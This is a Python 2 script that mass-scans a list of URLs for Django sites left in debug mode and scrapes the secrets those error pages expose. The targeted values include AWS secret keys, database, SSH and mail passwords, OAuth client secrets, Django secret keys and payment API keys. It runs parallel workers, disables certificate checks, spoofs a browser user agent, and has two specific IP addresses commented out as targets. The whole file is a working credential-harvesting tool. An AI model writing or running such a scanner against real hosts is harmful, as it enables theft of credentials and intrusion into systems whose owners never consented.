import requests
import optparse
import json
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()
from bs4 import BeautifulSoup
import multiprocessing
mapping = (
	'DB_HOST', 
	'MYSQL',
	'RDS_HOSTNAME', 
	'ADMIN_USER', 
	'RABBITMQ_HOST', 
	'WALLET_RW_HOST', 
	'POSTGRES_PASSWORD', 
	'KYC_API_KEY', 
	'DATABASE_URL',
	'AUTO_RECRAW_HOST',
	'BONANZA_API_KEY',
	'CELERY',
	'MWS_ACCESS_KEY',
	'PROXY_SECRET',
	'KEEPA_API',
	'MONGODB_PASSWORD',
	'SCRAPYMONGO_PASSWORD',
	'FACE_ID_DB_PASSWORD',
	'AWS_SECRET_ACCESS_KEY',
	'GOOGLE_OAUTH2_CLIENT_SECRET',
	'POSTGRES_PASSWORD',
	'DJANGO_SECRET_KEY',
	'FIREBASE_SERVER_KEY',
	'GOOGLE_API_KEY',
	'SSH_PASSWORD',
	'SSH_AUTH',
	'RABBITMQ_DEFAULT_PASS',
	'AWS_SECRET_KEY',
	'AWS_S3_BUCKET',
	'EMAIL_HOST_PASSWORD',
	'SENDGRID_PASSWORD',
	'PAYU_KEY',
	'DHL_API_CLIENT_SECRET',
	'LIGHT_PASSWORD',
	'DB_PASSWORD',
	'ATEL_AUTH_SECRET'
) 
		
def getHTML(url):
	headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0'}      
	r = requests.get(url, headers=headers, verify=False, timeout=15,allow_redirects=True)        
	return r.text
	
def checkDjango(url):
	bodyText=getHTML(url)
	soup = BeautifulSoup(bodyText, 'html.parser')
	title=soup.find('title')
	title=(title.text).replace("\n","")
	while "  " in title:
		title=title.replace("  "," ")
	if "DisallowedHost at /" in title:	
		foundKeys={}
		lastFoundKey=''
		tmpList=bodyText.split("\n")
		found=False
		for key in mapping:
			for x in tmpList:
				if found==True:
					soup1=BeautifulSoup(x, 'html.parser')
					text=(soup1.text).strip()
					#if "'********************'" not in text:
					foundKeys[lastFoundKey]=text
					lastFoundKey=''
					found=False
				soup1=BeautifulSoup(x, 'html.parser')
				text=(soup1.text).strip()
				if key==text:
					lastFoundKey=key
					found=True
		if len(foundKeys)>0:
			return url,foundKeys
		else:
			return url,None
	return None,None

parser = optparse.OptionParser()
parser.add_option('-f', action="store", dest="filename", help="file containing list of urls")
parser.add_option('--json', action="store_true",help="return results in json format")
options, remainder = parser.parse_args()
urlList=[]
if len(sys.argv)==1:
    parser.print_help()
    sys.exit(1)
if options.filename:
	with open(options.filename) as f:
		urlList = f.read().splitlines()
    
#urlList.append("http://110.8.117.5/")
#urlList.append("http://165.227.25.182:8000/")
results={}	
numOfThreads=10
p = multiprocessing.Pool(processes=numOfThreads)
tmpResultList = p.map(checkDjango,urlList)		
p.close()
for x in tmpResultList:
	if x[1]!=None:
		results[x[0]]=x[1]
for key, value in results.iteritems():
	if not options.json:
		print key
	for x in value.iteritems():
		if not options.json:
			print x[0]+"\t"+x[1]
	if not options.json:
		print "\n"
if options.json:
	dict_json = json.dumps(results)
	print(dict_json)			
